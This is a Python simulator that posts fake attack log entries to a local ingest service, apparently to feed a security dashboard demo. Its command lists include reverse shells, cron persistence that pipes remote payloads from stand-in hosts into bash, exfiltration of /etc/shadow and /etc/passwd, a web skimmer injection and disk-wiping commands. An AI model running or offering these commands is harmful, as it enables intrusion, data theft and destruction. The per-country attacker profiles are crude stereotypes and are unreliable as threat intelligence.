import random
import time
import requests
import json
from datetime import datetime
import ipaddress

# --- Configuration ---
INGEST_URL = "http://127.0.0.1:5000/logs"
ATTACK_INTERVAL_SECONDS = 0.2  # How often to send a fake attack
ATTACKERS_PER_COUNTRY = 6  # Number of attackers per country

# --- Country-Specific Attack Profiles ---

# Realistic IP ranges for each country
COUNTRY_IP_POOLS = {
    "India": ["117.200.0.0", "117.255.255.255"],
    "Indonesia": ["114.120.0.0", "114.127.255.255"],
    "USA": ["70.0.0.0", "70.255.255.255"],
    "Brazil": ["177.100.0.0", "177.103.255.255"],
    "Russia": ["5.200.0.0", "5.255.255.255"],
    "China": ["117.0.0.0", "117.255.255.255"],
    "North Korea": ["175.45.176.0", "175.45.179.255"],
    "Iran": ["2.176.0.0", "2.191.255.255"],
    "Nigeria": ["105.112.0.0", "105.119.255.255"],
    "Germany": ["46.4.0.0", "46.7.255.255"],
    "Vietnam": ["171.224.0.0", "171.255.255.255"],
    "Pakistan": ["39.32.0.0", "39.63.255.255"],
    "Turkey": ["78.160.0.0", "78.191.255.255"],
}

# Attack phase commands
RECON_COMMANDS = [
    "hostname", "arch", "uname -m", "lscpu", "df -h", "free -h", "uptime", "w", "who", "last", "lastlog",
    "ip a", "ifconfig", "ss -tulpn", "arp -a", "route", "top", "htop",
    "find / -name \"*.conf\"", "find / -perm -4000", "ls -R", "dir"
]

PRIVESC_COMMANDS = [
    "sudo -l", "sudo su", "sudo bash",
    "cat /etc/crontab", "crontab -l",
    "systemctl list-units --type=service --state=running",
    "service --status-all"
]

PERSISTENCE_COMMANDS = [
    "cat ~/.ssh/authorized_keys", "ssh-keygen",
    "useradd -m -s /bin/bash newuser",
    "cat /etc/hosts", "cat /etc/resolv.conf",
    "passwd", "su"
]

DOWNLOAD_COMMANDS = [
    "wget http://evil.com/malware.sh",
    "curl http://evil.com/malware.py",
    "nc -l -p 4444 -e /bin/bash",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "perl -e 'system(\"/bin/bash\")'",
    "apt-get install nmap", "yum install wireshark",
    "chmod +x malware.sh"
]

EXFIL_COMMANDS = [
    "tar -czvf backup.tar.gz /var/www",
    "nc 10.10.10.10 1234 < /etc/passwd",
    "history -c",
    "> ~/.bash_history",
    "dd if=/dev/zero of=/dev/sda"
]

DESTRUCTIVE_COMMANDS = [
    "rm -rf / --no-preserve-root",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1"
]

COMMON_MISTAKES = [
    "cls", "sl", "clear", "cd..", "man sudo", "echo $PATH"
]

# Each country has a bias for certain commands, reflecting real-world TTPs
COUNTRY_COMMAND_BIAS = {
    "India": {
        "recon": RECON_COMMANDS[:5],
        "download": DOWNLOAD_COMMANDS[:3],
        "persistence": PERSISTENCE_COMMANDS[:3],
        "common": COMMON_MISTAKES[:2]
    },
    "Indonesia": {
        "recon": RECON_COMMANDS[5:10],
        "privilege": PRIVESC_COMMANDS[:2],
        "common": COMMON_MISTAKES[2:4]
    },
    "USA": {
        "recon": ["nmap -sS 192.168.1.1", "ip a", "ss -tulpn", "route"],
        "privilege": ["sudo -l", "sudo su"],
        "persistence": ["cat ~/.ssh/authorized_keys", "ssh-keygen"],
        "download": ["apt-get install nmap", "wget http://tools.com/scanner.sh"]
    },
    "Brazil": {
        "destructive": DESTRUCTIVE_COMMANDS,
        "exfiltration": EXFIL_COMMANDS[:3],
        "common": COMMON_MISTAKES[4:]
    },
    "Russia": {
        "recon": RECON_COMMANDS[10:15],
        "persistence": PERSISTENCE_COMMANDS[3:],
        "download": ["nc -l -p 4444 -e /bin/bash", "python -c 'import socket'"],
        "exfiltration": ["tar -czvf backup.tar.gz /home", "nc 10.10.10.10 1234 < /etc/shadow"]
    },
    "China": {
        "recon": ["find / -name \"*.conf\"", "cat /etc/resolv.conf", "ss -tulpn"],
        "exfiltration": ["tar -czf /tmp/exfil.tar.gz /home", "scp user@attacker.com:/rootkit.tar.gz /tmp"],
        "persistence": ["crontab -l; echo '* * * * * wget -O- http://c2.com/payload.sh | bash' | crontab -"],
        "download": ["curl -X POST -d @/etc/shadow http://exfil.com/data"]
    },
    "North Korea": {
        "download": ["python crypto_miner.py -o pool.minexmr.com:4444 -u wallet"],
        "exfiltration": ["cat /home/*/.ssh/id_rsa"],
        "persistence": ["crontab -l; echo '* * * * * wget -O- http://c2.com/ransom.sh | bash' | crontab -"],
        "destructive": ["rm -rf /usr && rm -rf /lib && rm -rf /etc"]
    },
    "Iran": {
        "destructive": DESTRUCTIVE_COMMANDS,
        "recon": ["hostname", "uname -a", "df -h"],
        "privilege": ["sudo -l", "cat /etc/crontab"]
    },
    "Nigeria": {
        "recon": ["find /var/www/ -name '*.php' -exec grep -l 'password' {} \\;", "cat /var/log/mail.log"],
        "persistence": ["mail -s 'Urgent Invoice' victim@company.com < invoice.html"],
        "exfiltration": ["tar -czvf emails.tar.gz /var/mail"]
    },
    "Germany": {
        "download": ["sqlmap -u 'http://target.com/page?id=1' --dbs --batch", "nikto -h http://target.com"],
        "recon": ["wpscan --url http://target.com/blog --enumerate p"],
        "privilege": ["sudo -l", "cat /etc/crontab"]
    },
    "Vietnam": {
        "recon": ["grep -i 'credit' /var/www/html/*", "find /var/www/ -name '*.js' -exec grep -l 'base64_decode' {} \\;"],
        "exfiltration": ["tail -f /var/log/apache2/access.log | grep POST"],
        "persistence": ["echo '<script src=\"http://evil.com/skimmer.js\"></script>' >> /var/www/html/footer.html"]
    },
    "Pakistan": {
        "recon": ["nmap -sV -p- target.com", "ping -c 4 target.com", "nslookup target.com"],
        "download": ["wget http://recon-tools.com/scanner.sh"],
        "common": ["man nmap", "echo $PATH"]
    },
    "Turkey": {
        "recon": ["find / -name 'config.php' 2>/dev/null", "ls -la /tmp/"],
        "destructive": ["echo 'HACKED BY TURKISH_HAWK' > /var/www/html/index.html"],
        "persistence": ["useradd -m -s /bin/bash turk_hawk"]
    }
}

# Track attackers from each country
COUNTRY_ATTACKERS = {country: [] for country in COUNTRY_IP_POOLS.keys()}

# --- Helper Functions ---

def get_random_ip_from_pool(country):
    """Generates a random IP within a country's defined range."""
    start_ip = COUNTRY_IP_POOLS[country][0]
    end_ip = COUNTRY_IP_POOLS[country][1]
    
    # Convert to IP address objects for proper calculation
    start = ipaddress.IPv4Address(start_ip)
    end = ipaddress.IPv4Address(end_ip)
    
    # Generate a random IP in the range
    random_ip_int = random.randint(int(start), int(end))
    return str(ipaddress.IPv4Address(random_ip_int))

def get_or_create_attacker(country):
    """Get an existing attacker from a country or create a new one."""
    if len(COUNTRY_ATTACKERS[country]) < ATTACKERS_PER_COUNTRY:
        # Create a new attacker
        attacker_ip = get_random_ip_from_pool(country)
        COUNTRY_ATTACKERS[country].append(attacker_ip)
        return attacker_ip
    else:
        # Use an existing attacker
        return random.choice(COUNTRY_ATTACKERS[country])

def generate_log():
    """Generates a single, realistic log entry."""
    # 1. Choose a country to attack from
    country = random.choice(list(COUNTRY_IP_POOLS.keys()))
    source_ip = get_or_create_attacker(country)
    
    # 2. Choose an event type
    event_type = random.choice(["connection_established", "login_attempt", "command_executed"])
    
    # 3. Generate details based on event type and country bias
    details = {}
    if event_type == "login_attempt":
        details["username"] = random.choice(["admin", "root", "user", "test", "oracle"])
        details["status"] = random.choice(["success", "failed"])
    elif event_type == "command_executed":
        # Use a command from the country's biased list
        country_commands = COUNTRY_COMMAND_BIAS[country]
        command_category = random.choice(list(country_commands.keys()))
        command_list = country_commands[command_category]
        details["command"] = random.choice(command_list)
        details["category"] = command_category
    else: # connection_established
        details["service"] = random.choice(["ssh", "http", "ftp"])

    return {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "event_type": event_type,
        "source_ip": source_ip,
        "source_country": country,
        "details": details
    }

# --- Main Simulation Loop ---

def main():
    print("[+] Starting attack simulation...")
    print(f"[*] Sending an attack every {ATTACK_INTERVAL_SECONDS} second(s) to {INGEST_URL}")
    print(f"[*] Simulating {ATTACKERS_PER_COUNTRY} attackers from each of {len(COUNTRY_IP_POOLS)} countries.")
    print("[*] Press Ctrl+C to stop.")
    
    # Initialize attackers for each country
    for country in COUNTRY_IP_POOLS.keys():
        for _ in range(ATTACKERS_PER_COUNTRY):
            COUNTRY_ATTACKERS[country].append(get_random_ip_from_pool(country))
    
    while True:
        try:
            log_entry = generate_log()
            response = requests.post(INGEST_URL, json=log_entry, timeout=5)
            
            if response.status_code == 201:
                # For better visibility, print the country and IP
                print(f"[+] Attack from {log_entry['source_country']} ({log_entry['source_ip']}) - Type: {log_entry['event_type']}")
                if log_entry['event_type'] == 'command_executed':
                    print(f"    Command: {log_entry['details']['command']}")
            else:
                print(f"[-] Failed to send log. Status: {response.status_code}, Response: {response.text}")
            
            time.sleep(ATTACK_INTERVAL_SECONDS)

        except requests.exceptions.RequestException as e:
            print(f"[-] Could not connect to ingest service at {INGEST_URL}. Is it running? Error: {e}")
            time.sleep(5) # Wait before retrying
        except KeyboardInterrupt:
            print("\n[+] Simulation stopped by user.")
            break
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}")
            time.sleep(5)

if __name__ == '__main__':
    main()